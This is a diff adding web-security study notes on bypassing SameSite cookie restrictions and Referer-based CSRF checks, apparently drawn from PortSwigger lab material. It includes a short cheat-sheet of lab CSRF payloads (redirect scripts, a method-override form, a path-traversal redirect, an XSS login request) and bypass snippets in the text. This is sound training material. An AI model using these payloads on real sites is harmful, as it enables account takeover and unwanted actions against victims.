@@ -14,6 +14,19 @@
 <input name=email value=pwned@evil-user.net>
 </form>
 <script>document.forms[0].submit()</script>
+
+#SameSite
+Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite={Strict,Lax,None}
+Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
+
+#Lax bypass
+<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; </script>
+		
+# Strict bypass (samesite injectable redirect)
+`<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>`
+
+# Strict bypass (sibling redirect with xss)
+`GET https://cms-0a74007c04954788bc3312d200a80090.web-security-academy.net/login?username=$xsspayload&password=b`
 ```
 
 ---
@@ -324,3 +337,330 @@ You cannot register an email address that is already taken by another user. If y
 [lab6](lab/wsa-csrf-lab1-6.md)
 
 ---
+
+## Bypassing SameSite cookie restrictions
+
+SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits.
+
+Since 2021, Chrome applies `Lax` SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level. This is a proposed standard, and we expect other major browsers to adopt this behavior in the future. As a result, it's essential to have solid grasp of how these restrictions work, as well as how they can potentially be bypassed, in order to thoroughly test for cross-site attack vectors.
+
+In this section, we'll first cover how the SameSite mechanism works and clarify some of the related terminology. We'll then look at some of the most common ways you may be able to bypass these restrictions, enabling CSRF and other cross-site attacks on websites that may initially appear secure.
+
+---
+
+## What is a site in the context of SameSite cookies?
+
+In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the TLD+1.
+
+When determining whether a request is same-site or not, the URL scheme is also taken into consideration. This means that a link from `http://app.example.com` to `https://app.example.com` is treated as cross-site by most browsers.
+
+![What is the site for SameSite cookies?](https://portswigger.net/web-security/csrf/images/site-definition.png)
+
+#### Note
+
+You may come across the term "effective top-level domain" (eTLD). This is just a way of accounting for the reserved multipart suffixes that are treated as top-level domains in practice, such as `.co.uk`.
+
+---
+
+## What's the difference between a site and an origin?
+
+The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications.
+
+Two URLs are considered to have the same origin if they share the exact same scheme, domain name, and port. Although note that the port is often inferred from the scheme.
+
+![Site vs origin](https://portswigger.net/web-security/csrf/images/site-vs-origin.png)
+
+As you can see from this example, the term "site" is much less specific as it only accounts for the scheme and last part of the domain name. Crucially, this means that a cross-origin request can still be same-site, but not the other way around.
+
+|   |   |   |   |
+|---|---|---|---|
+|**Request from**|**Request to**|**Same-site?**|**Same-origin?**|
+|`https://example.com`|`https://example.com`|Yes|Yes|
+|`https://app.example.com`|`https://intranet.example.com`|Yes|No: mismatched domain name|
+|`https://example.com`|`https://example.com:8080`|Yes|No: mismatched port|
+|`https://example.com`|`https://example.co.uk`|No: mismatched eTLD|No: mismatched domain name|
+|`https://example.com`|`http://example.com`|No: mismatched scheme|No: mismatched scheme|
+
+This is an important distinction as it means that any vulnerability enabling arbitrary JavaScript execution can be abused to bypass site-based defenses on other domains belonging to the same site. We'll see an example of this in one of the labs later.
+
+---
+
+## How does SameSite work?
+
+Before the SameSite mechanism was introduced, browsers sent cookies in every request to the domain that issued them, even if the request was triggered by an unrelated third-party website. SameSite works by enabling browsers and website owners to limit which cross-site requests, if any, should include specific cookies. This can help to reduce users' exposure to CSRF attacks, which induce the victim's browser to issue a request that triggers a harmful action on the vulnerable website. As these requests typically require a cookie associated with the victim's authenticated session, the attack will fail if the browser doesn't include this.
+
+All major browsers currently support the following SameSite restriction levels:
+
+- `Strict`
+- `Lax`
+- `None`
+
+---
+
+## How does SameSite work? - Continued
+
+Developers can manually configure a restriction level for each cookie they set, giving them more control over when these cookies are used. To do this, they just have to include the `SameSite` attribute in the `Set-Cookie` response header, along with their preferred value:
+
+`Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`
+
+Although this offers some protection against CSRF attacks, none of these restrictions provide guaranteed immunity, as we'll demonstrate using deliberately vulnerable, interactive labs later in this section.
+
+#### Note
+
+If the website issuing the cookie doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior. As this is a proposed new standard, we expect other major browsers to adopt this behavior in future.
+
+---
+
+## Strict
+
+If a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.
+
+This is recommended when setting cookies that enable the bearer to modify data or perform other sensitive actions, such as accessing specific pages that are only available to authenticated users.
+
+Although this is the most secure option, it can negatively impact the user experience in cases where cross-site functionality is desirable.
+
+---
+
+## None
+
+If a cookie is set with the `SameSite=None` attribute, this effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites.
+
+With the exception of Chrome, this is the default behavior used by major browsers if no `SameSite` attribute is provided when setting the cookie.
+
+There are legitimate reasons for disabling SameSite, such as when the cookie is intended to be used from a third-party context and doesn't grant the bearer access to any sensitive data or functionality. Tracking cookies are a typical example.
+
+---
+
+## None - Continued
+
+If you encounter a cookie set with `SameSite=None` or with no explicit restrictions, it's worth investigating whether it's of any use. When the "Lax-by-default" behavior was first adopted by Chrome, this had the side-effect of breaking a lot of existing web functionality. As a quick workaround, some websites have opted to simply disable SameSite restrictions on all cookies, including potentially sensitive ones.
+
+When setting a cookie with `SameSite=None`, the website must also include the `Secure` attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.
+
+`Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`
+
+---
+
+## Bypassing SameSite Lax restrictions using GET requests
+
+In practice, servers aren't always fussy about whether they receive a `GET` or `POST` request to a given endpoint, even those that are expecting a form submission. If they also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a `GET` request from the victim's browser.
+
+As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the simplest approaches to launching such an attack:
+
+`<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>`
+
+---
+
+## Bypassing SameSite Lax restrictions using GET requests - Continued
+
+Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:
+
+`<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> <input type="hidden" name="_method" value="GET"> <input type="hidden" name="recipient" value="hacker"> <input type="hidden" name="amount" value="1000000"> </form>`
+
+Other frameworks support a variety of similar parameters.
+
+---
+
+## Lab: SameSite Lax bypass via method override
+
+PRACTITIONER
+
+LABNot solved
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+#### Note
+
+The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.## Lab: SameSite Lax bypass via method override
+
+PRACTITIONER
+
+LABNot solved
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+#### Note
+
+The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.
+
+[SameSite-bypass](lab/SameSite-bypass.md)
+
+---
+
+## Bypassing SameSite restrictions using on-site gadgets
+
+If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.
+
+One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. For some examples, see our materials on DOM-based open redirection.
+
+---
+
+## Bypassing SameSite restrictions using on-site gadgets - Continued
+
+As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.
+
+If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.
+
+Note that the equivalent attack is not possible with server-side redirects. In this case, browsers recognize that the request to follow the redirect resulted from a cross-site request initially, so they still apply the appropriate cookie restrictions.
+
+---
+
+## Lab: SameSite Strict bypass via client-side redirect
+
+PRACTITIONER
+
+LABNot solved
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+[lab8](lab/SameSite-bypass.md)
+
+---
+
+## Bypassing SameSite restrictions via vulnerable sibling domains
+
+Whether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin.
+
+Make sure you thoroughly audit all of the available attack surface, including any sibling domains. In particular, vulnerabilities that enable you to elicit an arbitrary secondary request, such as XSS, can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks.
+
+In addition to classic CSRF, don't forget that if the target website supports WebSockets, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake. For more details, see our topic on WebSocket vulnerabilities.
+
+---
+
+## Lab: SameSite Strict bypass via sibling domain
+
+PRACTITIONER
+
+LABNot solved
+
+This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.
+
+To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.
+
+If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.
+
+[lab websocket-csrf](./lab/websocket-csrf.md)
+
+---
+
+## Bypassing SameSite Lax restrictions with newly issued cookies
+
+Cookies with `Lax` SameSite restrictions aren't normally sent in any cross-site `POST` requests, but there are some exceptions.
+
+As mentioned earlier, if a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies `Lax` restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.
+
+#### Note
+
+This two-minute window does not apply to cookies that were explicitly set with the `SameSite=Lax` attribute.
+
+It's somewhat impractical to try timing the attack to fall within this short window. On the other hand, if you can find a gadget on the site that enables you to force the victim to be issued a new session cookie, you can preemptively refresh their cookie before following up with the main attack. For example, completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site.
+
+---
+
+## Bypassing SameSite Lax restrictions with newly issued cookies - Continued
+
+To trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.
+
+Alternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default:
+
+`window.open('https://vulnerable-website.com/login/sso');`
+
+To get around this, you can wrap the statement in an `onclick` event handler as follows:
+
+`window.onclick = () => { window.open('https://vulnerable-website.com/login/sso'); }`
+
+This way, the `window.open()` method is only invoked when the user clicks somewhere on the page.
+
+---
+
+## Lab: SameSite Lax bypass via cookie refresh
+
+PRACTITIONER
+
+LABNot solved
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+The lab supports OAuth-based login. You can log in via your social media account with the following credentials: `wiener:peter`
+
+#### Note
+
+The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.
+
+[OAuth Lax bypass](./lab/oauth-lax.md)
+
+---
+
+## Bypassing Referer-based CSRF defenses
+
+Aside from defenses that employ CSRF tokens, some applications make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.
+
+#### Referer header
+
+The HTTP Referer header (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form. Various methods exist that allow the linking page to withhold or modify the value of the `Referer` header. This is often done for privacy reasons.
+
+---
+
+## Validation of Referer depends on header being present
+
+Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted.
+
+In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:
+
+`<meta name="referrer" content="never">`
+
+---
+
+## Lab: CSRF where Referer validation depends on header being present
+
+PRACTITIONER
+
+LABNot solved
+
+This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
+
+To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+---
+
+## Validation of Referer can be circumvented
+
+Some applications validate the `Referer` header in a naive way that can be bypassed. For example, if the application validates that the domain in the `Referer` starts with the expected value, then the attacker can place this as a subdomain of their own domain:
+
+`http://vulnerable-website.com.attacker-website.com/csrf-attack`
+
+Likewise, if the application simply validates that the `Referer` contains its own domain name, then the attacker can place the required value elsewhere in the URL:
+
+`http://attacker-website.com/csrf-attack?vulnerable-website.com`
+
+#### Note
+
+Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the `Referer` header by default.
+
+You can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that `Referrer` is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.
+
+---
+
+## Lab: CSRF with broken Referer validation
+
+PRACTITIONER
+
+LABNot solved
+
+This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
+
+To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+---
+
+# end
